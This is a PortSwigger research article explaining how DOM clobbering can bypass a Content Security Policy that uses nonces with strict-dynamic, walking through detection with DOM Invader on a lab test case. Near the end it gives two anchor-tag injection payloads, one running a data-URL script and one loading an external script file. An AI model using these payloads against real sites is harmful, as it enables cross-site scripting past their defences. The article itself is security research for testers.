# Bypassing CSP via DOM clobbering

Source: https://portswigger.net/research/bypassing-csp-via-dom-clobbering
Fetched: 2026-06-28T09:17:21.658948+00:00

Bypassing CSP via DOM clobbering

Gareth Heyes

Researcher

@garethheyes

Published: Monday, 5 June 2023 at 14:00 UTC

Updated: Monday, 5 June 2023 at 14:00 UTC

You might have found HTML injection, but unfortunately identified that the site is protected with CSP. All is not lost, it might be possible to bypass CSP using DOM clobbering, which you can now detect using DOM Invader! In this post we'll show you how.

We've based the test case on a bug bounty site, so you're likely to encounter similar code in the wild. If you're unfamiliar with DOM clobbering then head over to our Academy to learn about this attack class and solve the labs.

What you need for the exploit

To exploit DOM clobbering you need three things:

1. HTML injection

2. A gadget - a property name or multiple property names

3. A sink

To bypass CSP, your gadget needs to end up in a sink that is allowed by the policy. This could be an eval function. More realistically, it could be a script that is protected by a nonce and a strict-dynamic source expression in the CSP. When using strict-dynamic the script protected by a nonce is allowed to generate other scripts. We can take advantage of that to introduce our own scripts.

Identifying a DOM clobbering vulnerability

First we need to load our test case in Burp browser. To access the test case, visit the following link: DOM clobbering test case protected by CSP.

Then we need to enable DOM Invader:

Once DOM Invader is enabled, we need to enable DOM clobbering detection. You'll notice that DOM Invader shows a warning message, as DOM clobbering attacks may cause the site to break. We therefore recommend that you only enable DOM clobbering when you want to test a specific page.

Then we need to reload the test case. If everything goes well you'll see that DOM Invader has found one sink named script.src. You'll notice that the sink value contains a string domclobbering, followed by two property names and a canary. This is the method DOM invader uses to find DOM clobbering vulnerabilities because multiple sinks and values could contain a clobbered property.

Bypassing CSP to exploit the vulnerability

We've found a vulnerability and now we need to construct a DOM clobbering attack. Remember we also need HTML injection. Thankfully our test case has such a hole.

We can try injecting a script. Notice that CSP prevents execution. Then we can use the information that DOM Invader has reported to construct an attack that attempts to bypass the CSP. Using the sink value in the above screenshot it looks like we need the properties ehy and codeBasePath. Notice that the sink value also contains a path /utils.js to a JavaScript file. We'll need to account for this in our exploit with a single line comment.

We now need to craft an exploit. If you need to refresh your memory on how to do this, visit the learning materials on our Academy. We know the gadget ends up in a script.src attribute. If we click the stack trace and view the console we'll see the exact line where the sink occurs. Creating the exploit involves injecting two anchor tags that clobbers those properties:

<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>

View the solution

In the example we use a data URL, it's worth noting that this is not required it just was more elegant. You can use HTTP URLs instead and this will work perfectly fine. Notice I use a question mark instead of a single line comment to move the utils filename to the query string.

<a id=ehy><a id=ehy name=codeBasePath href="//subdomain1.portswigger-labs.net/xss/xss.js?">

HTTP example

DOM Clobbering

DOM

XSS

csp

Back to all articles

Related Research

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

03 September 2025

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

Stealing HttpOnly cookies with the cookie sandwich technique

22 January 2025

Stealing HttpOnly cookies with the cookie sandwich technique

Bypassing WAFs with the phantom $Version cookie

04 December 2024

Bypassing WAFs with the phantom $Version cookie

Concealing payloads in URL credentials

23 October 2024

Concealing payloads in URL credentials
